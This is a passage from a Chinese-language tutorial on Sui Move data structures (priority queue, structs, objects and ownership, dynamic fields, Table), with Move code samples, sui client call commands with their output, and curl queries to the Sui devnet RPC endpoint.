heap）来实现。</p><p>大顶堆是一种二叉树结构，每个节点的值都大于或等于其左右孩子节点的值，这样，这个二叉树的根节点始终都是所有节点中值最大的节点。</p><p>在优先队列中，我们为每一个节点赋予一个权重，我们基于权重构建一个大顶堆，从大顶堆顶部弹出根节点则为权重最大的节点。这样就形成过了一个按优先级弹出的队列。</p><p>优先队列主要包含的操作为：</p><ul><li>创建条目列表： <code>create_entries</code> ，结果作为 <code>new</code> 方法参数</li><li>创建： <code>new</code></li><li>插入： <code>insert</code></li><li>弹出最大： <code>pop_max</code></li></ul><p>示例：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::pq &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::priority_queue::&#123;PriorityQueue, pop_max, create_entries, new, insert&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 检查弹出的最大值及其权重</span></span><br><span class="line">    fun <span class="title function_ invoke__">check_pop_max</span>(h: &amp;<span class="keyword">mut</span> PriorityQueue&lt;<span class="type">u64</span>&gt;, expected_priority: <span class="type">u64</span>, expected_value: <span class="type">u64</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> (priority, value) = <span class="title function_ invoke__">pop_max</span>(h);</span><br><span class="line">        <span class="built_in">assert!</span>(priority == expected_priority, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(value == expected_value, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h</span> = <span class="title function_ invoke__">new</span>(<span class="title function_ invoke__">create_entries</span>(vector[<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>], vector[<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">60</span>]));</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">5</span>, <span class="number">50</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">4</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">3</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="title function_ invoke__">insert</span>(&amp;<span class="keyword">mut</span> h, <span class="number">7</span>, <span class="number">70</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">7</span>, <span class="number">70</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">2</span>, <span class="number">40</span>);</span><br><span class="line">        <span class="title function_ invoke__">insert</span>(&amp;<span class="keyword">mut</span> h, <span class="number">0</span>, <span class="number">80</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">2</span>, <span class="number">60</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">1</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">0</span>, <span class="number">80</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="jie-gou-ti-struct">结构体（Struct）</span></h3><p>Move语言中，结构体是包含类型化字段的用户定义数据结构。 结构可以存储任何非引用类型，包括其他结构。示例：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::structs &#123;</span><br><span class="line">    <span class="comment">// 二维平面点</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Point</span> has copy, drop, store &#123;</span><br><span class="line">        x: <span class="type">u64</span>,</span><br><span class="line">        y: <span class="type">u64</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 圆</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Circle</span> has copy, drop, store &#123;</span><br><span class="line">        center: Point,</span><br><span class="line">        radius: <span class="type">u64</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建结构体</span></span><br><span class="line">    public fun <span class="title function_ invoke__">new_point</span>(x: <span class="type">u64</span>, y: <span class="type">u64</span>): Point &#123;</span><br><span class="line">        Point &#123;</span><br><span class="line">            x, y</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 访问结构体数据</span></span><br><span class="line">    public fun <span class="title function_ invoke__">point_x</span>(p: &amp;Point): <span class="type">u64</span> &#123;</span><br><span class="line">        p.x</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun <span class="title function_ invoke__">point_y</span>(p: &amp;Point): <span class="type">u64</span> &#123;</span><br><span class="line">        p.y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">abs_sub</span>(a: <span class="type">u64</span>, b: <span class="type">u64</span>): <span class="type">u64</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line">            b - a</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            a - b</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算点之间的距离</span></span><br><span class="line">    public fun <span class="title function_ invoke__">dist_squared</span>(p1: &amp;Point, p2: &amp;Point): <span class="type">u64</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">dx</span> = <span class="title function_ invoke__">abs_sub</span>(p1.x, p2.x);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">dy</span> = <span class="title function_ invoke__">abs_sub</span>(p1.y, p2.y);</span><br><span class="line">        dx * dx + dy * dy</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun <span class="title function_ invoke__">new_circle</span>(center: Point, radius: <span class="type">u64</span>): Circle &#123;</span><br><span class="line">        Circle &#123; center, radius &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算两个圆之间是否相交</span></span><br><span class="line">    public fun <span class="title function_ invoke__">overlaps</span>(c1: &amp;Circle, c2: &amp;Circle): <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">d</span> = <span class="title function_ invoke__">dist_squared</span>(&amp;c1.center, &amp;c2.center);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">r1</span> = c1.radius;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">r2</span> = c2.radius;</span><br><span class="line">        d * d &lt;= r1 * r1 + <span class="number">2</span> * r1 * r2 + r2 * r2</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="dui-xiang-object">对象（Object）</span></h3><p>对象是 Sui Move 中新引入的概念，也是 Sui 安全和高并发等众多特性的基础。定义一个对象，需要为结构体添加 <code>key</code> 能力，同时结构体的第一个字段必须是 <code>UID</code> 类型的 id。</p><p>对象结构中除了可以使用基础数据结构外，也可以包含另一个对象，即对象可以进行包装，在一个对象中使用另一个对象。</p><p>对象有不同的所有权形式，可以存放在一个地址下面，也可以设置成不可变对象或者全局对象。不可变对象永远不能被修改，转移或者删除，因此它不属于任何人，但也可以被任何人访问。比如合约包对象，Coin Metadata 对象。</p><p>我们可以通过 <code>transfer</code> 包中的方法对对象进行处理：</p><ul><li><code>transfer</code>：将对象放到某个地址下</li><li><code>freeze_object</code>：创建不可变对象</li><li><code>share_object</code>：创建共享对象</li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::objects &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;<span class="keyword">Self</span>, TxContext&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ColorObject</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        red: <span class="type">u8</span>,</span><br><span class="line">        green: <span class="type">u8</span>,</span><br><span class="line">        blue: <span class="type">u8</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">new</span>(red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>, ctx: &amp;<span class="keyword">mut</span> TxContext): ColorObject &#123;</span><br><span class="line">        ColorObject &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">new</span>(ctx),</span><br><span class="line">            red,</span><br><span class="line">            green,</span><br><span class="line">            blue,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">create</span>(red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">color_object</span> = <span class="title function_ invoke__">new</span>(red, green, blue, ctx);</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(color_object, tx_context::<span class="title function_ invoke__">sender</span>(ctx))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun <span class="title function_ invoke__">get_color</span>(<span class="keyword">self</span>: &amp;ColorObject): (<span class="type">u8</span>, <span class="type">u8</span>, <span class="type">u8</span>) &#123;</span><br><span class="line">        (<span class="keyword">self</span>.red, <span class="keyword">self</span>.green, <span class="keyword">self</span>.blue)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Copies the values of `from_object` into `into_object`.</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">copy_into</span>(from_object: &amp;ColorObject, into_object: &amp;<span class="keyword">mut</span> ColorObject) &#123;</span><br><span class="line">        into_object.red = from_object.red;</span><br><span class="line">        into_object.green = from_object.green;</span><br><span class="line">        into_object.blue = from_object.blue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">delete</span>(object: ColorObject) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">ColorObject</span> &#123; id, red: _, green: _, blue: _ &#125; = object;</span><br><span class="line">        object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">transfer</span>(object: ColorObject, recipient: address) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(object, recipient)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">freeze_object</span>(object: ColorObject) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">freeze_object</span>(object)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">create_shareable</span>(red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">color_object</span> = <span class="title function_ invoke__">new</span>(red, green, blue, ctx);</span><br><span class="line">        transfer::<span class="title function_ invoke__">share_object</span>(color_object)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">create_immutable</span>(red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">color_object</span> = <span class="title function_ invoke__">new</span>(red, green, blue, ctx);</span><br><span class="line">        transfer::<span class="title function_ invoke__">freeze_object</span>(color_object)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">update</span>(</span><br><span class="line">        object: &amp;<span class="keyword">mut</span> ColorObject,</span><br><span class="line">        red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>,</span><br><span class="line">    ) &#123;</span><br><span class="line">        object.red = red;</span><br><span class="line">        object.green = green;</span><br><span class="line">        object.blue = blue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后调用：</p><ol><li>创建共享对象</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> create_shareable \</span><br><span class="line">  --module objects \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 1 2 3 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果输出</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0x3b25eba3bf836088b56bdfd36e39ec440db8bf59 , Owner: Shared</span><br></pre></td></tr></table></figure><ol><li>创建不可变对象</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> create_immutable \</span><br><span class="line">  --module objects \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 1 2 3 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果输出</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0x88f8f210635af6503a8a07835ef12e147fa60aa3 , Owner: Immutable</span><br></pre></td></tr></table></figure><ol><li>将对象放入某个地址下</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> create \</span><br><span class="line">  --module objects \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 1 2 3 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果输出</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0xf36144c71cde87c1e00f1bf00ee44653bc05228c , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br></pre></td></tr></table></figure><p>可以看到，不同所有权类型的对象会在创建时显示不同的类型结果。</p><ol><li>修改共享对象或者是地址所拥有的对象：传入对象 ID 作为参数</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> update \</span><br><span class="line">  --module objects \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 0x3b25eba3bf836088b56bdfd36e39ec440db8bf59 4 5 6 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果输出</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0x3b25eba3bf836088b56bdfd36e39ec440db8bf59 , Owner: Shared</span><br></pre></td></tr></table></figure><p>可以在结果中看到 <code>Mutated Objects</code> 中对象已经发生了变化。</p><h3><span id="dynamic-field-he-dynamic-object-field">Dynamic field 和 Dynamic object field</span></h3><p>对象虽然可以进行包装，但是也有一些局限，一是对象中的字段是有限的，在结构体定义是已经确定；二是包含其他对象的对象可能非常大，可能会导致交易 gas 很高，Sui 默认结构体大小限制为 2MB；再者，当遇到要储存不一样类型的对象集合时，问题就会比较棘手，Move 中的 <code>vector</code> 只能存储相同的类型的数据。</p><p>因此，Sui 提供了 dynamic field，可以使用任意名字做字段，也可以动态添加和删除。唯一影响的是 gas 的消耗。</p><p>dynamic field 包含两种类型，field 和 Object field，区别在于，field 可以存储任何有 <code>store</code> 能力的值，但是如果是对象的话，对象会被认为是被包装而不能通过 ID 被外部工具（浏览器，钱包等）访问；而 Object field 的值必须是对象（有 <code>key</code> 能力且第一个字段是 <code>id: UID</code>），对象仍然能从外部工具通过 ID 访问。</p><p>dynamic filed 的名称可以是任何拥有 <code>copy</code>，<code>drop</code> 和 <code>store</code> 能力的值，这些值包括 Move 中的基本类型（整数，布尔值，字节串），以及拥有 <code>copy</code>，<code>drop</code> 和 <code>store</code> 能力的结构体。</p><p>下面我们通过例子来看看具体的操作：</p><ul><li>添加字段： <code>add</code></li><li>访问和修改字段： <code>borrow</code>， <code>borow_mut</code></li><li>删除字段</li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::fields &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::dynamic_object_field <span class="keyword">as</span> dof;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;<span class="keyword">Self</span>, TxContext&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Parent</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Child</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        count: <span class="type">u64</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">initialize</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(Parent &#123; id: object::<span class="title function_ invoke__">new</span>(ctx) &#125;, tx_context::<span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(Child &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), count: <span class="number">0</span> &#125;, tx_context::<span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">add_child</span>(parent: &amp;<span class="keyword">mut</span> Parent, child: Child) &#123;</span><br><span class="line">        dof::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> parent.id, <span class="string">b&quot;child&quot;</span>, child);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">mutate_child</span>(child: &amp;<span class="keyword">mut</span> Child) &#123;</span><br><span class="line">        child.count = child.count + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">mutate_child_via_parent</span>(parent: &amp;<span class="keyword">mut</span> Parent) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mutate_child</span>(dof::borrow_mut&lt;vector&lt;<span class="type">u8</span>&gt;, Child&gt;(</span><br><span class="line">            &amp;<span class="keyword">mut</span> parent.id,</span><br><span class="line">            <span class="string">b&quot;child&quot;</span>,</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">delete_child</span>(parent: &amp;<span class="keyword">mut</span> Parent) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">Child</span> &#123; id, count: _ &#125; = dof::remove&lt;vector&lt;<span class="type">u8</span>&gt;, Child&gt;(</span><br><span class="line">            &amp;<span class="keyword">mut</span> parent.id,</span><br><span class="line">            <span class="string">b&quot;child&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">reclaim_child</span>(parent: &amp;<span class="keyword">mut</span> Parent, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">child</span> = dof::remove&lt;vector&lt;<span class="type">u8</span>&gt;, Child&gt;(</span><br><span class="line">            &amp;<span class="keyword">mut</span> parent.id,</span><br><span class="line">            <span class="string">b&quot;child&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(child, tx_context::<span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并调用 <code>initialize</code> 和 <code>add_child</code> 方法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> initialize \</span><br><span class="line">  --module fields \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0x55536ca8123ffb606398da9f7d2472888ca5bfd1 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br><span class="line">  - ID: 0xf1206f0f7d97908aae907c23d69a4cd97120dc82 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> add_child \</span><br><span class="line">  --module fields \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 0xf1206f0f7d97908aae907c23d69a4cd97120dc82 0x55536ca8123ffb606398da9f7d2472888ca5bfd1 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0xdf694f282f739f328325bc922b3083bd45f31cae , Owner: Object ID: ( 0xf1206f0f7d97908aae907c23d69a4cd97120dc82 )</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0x55536ca8123ffb606398da9f7d2472888ca5bfd1 , Owner: Object ID: ( 0xdf694f282f739f328325bc922b3083bd45f31cae )</span><br><span class="line">  - ID: 0xf1206f0f7d97908aae907c23d69a4cd97120dc82 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br></pre></td></tr></table></figure><p>可以通过 <code>sui_getDynamicFields</code> 方法查看添加的字段：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> https://fullnode.devnet.sui.io:443 -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;sui_getDynamicFields&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;:[</span></span><br><span class="line"><span class="string">      &quot;0xf1206f0f7d97908aae907c23d69a4cd97120dc82&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vector[99u8, 104u8, 105u8, 108u8, 100u8]&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DynamicObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;objectType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xee2961ee26916285ebef57c68caaa5f67a3d8dbd::fields::Child&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;objectId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x55536ca8123ffb606398da9f7d2472888ca5bfd1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">1621</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GNSaPghN+tRBkxKiVhQCn9jVBkjYV4RU4oF+c4CUGJM=&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nextCursor&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>其中 <code>name</code> 为 <code>“child”</code> 。同时，对于对象 ID <code>0x55536ca8123ffb606398da9f7d2472888ca5bfd1</code>，我们仍然能从链上追踪对应信息。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> https://fullnode.devnet.sui.io:443 -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;sui_getObject&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;:[</span></span><br><span class="line"><span class="string">      &quot;0x55536ca8123ffb606398da9f7d2472888ca5bfd1&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="ji-he-shu-ju-lei-xing">集合数据类型</span></h3><p>接下来，我们介绍几种基于 dynamic field 的集合数据类型。</p><p>前面介绍过，带有 dynamic field 的对象可以被删除，但是这对于链上集合类型来说这是不希望发生的，因为链上集合类型可能将无限多的键值对作为 dynamic field 保存。因此，在 Sui 提供了两种集合类型： <code>Table</code> 和 <code>Bag</code>，两者都基于 dynamic field 构建的映射类型的数据结构，但是额外支持计算它们包含的条目数，并防止在非空时意外删除。</p><p><code>Table</code> 和 <code>Bag</code> 的区别在于，Table 是同质（*homogeneous）*映射，所以的键必须是同一个类型，所以的值也必须是同一个类型，而 Bag 是异质（<em>heterogeneous</em>）映射，可以存储任意类型的键值对。</p><p>同时，Sui 标准库中还包含对象版本的 <code>Table</code> 和 <code>Bag</code>： <code>ObjectTable</code> 和 <code>ObjectBag</code>，区别在于前者可以将任何 <code>store</code> 能力的值保存，但从外部存储查看时，作为值存储的对象将被隐藏，后者只能将对象作为值存储，但可以从外部存储中通过 ID 访问这些对象。</p><p>与之前介绍过的 <code>vec_map</code> 相比，<code>table</code> 更适合用来处理包含大量映射的情况。</p><h3><span id="table">Table</span></h3><p>下面我们通过示例来展示对 table 的基本操作：</p><ul><li>添加元素： <code>add</code></li><li>读取和修改元素： <code>borrow</code>，<code>borrow_mut</code></li><li>删除元素： <code>delete</code></li><li>元素长度： <code>length</code></li><li>判断存在性：<code>contains</code></li></ul><p>Object table 的操作与 table 类似。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::tables &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;<span class="keyword">Self</span>, TxContext&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::table::&#123;<span class="keyword">Self</span>, Table&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> EChildAlreadyExists: <span class="type">u64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> EChildNotExists: <span class="type">u64</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Parent</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        children: Table&lt;<span class="type">u64</span>, Child&gt;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Child</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        age: <span class="type">u64</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建 Parent 对象</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">initialize</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(</span><br><span class="line">            Parent &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), children: table::<span class="title function_ invoke__">new</span>(ctx) &#125;,</span><br><span class="line">            tx_context::<span class="title function_ invoke__">sender</span>(ctx)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun <span class="title function_ invoke__">child_age</span>(child: &amp;Child): <span class="type">u64</span> &#123;</span><br><span class="line">        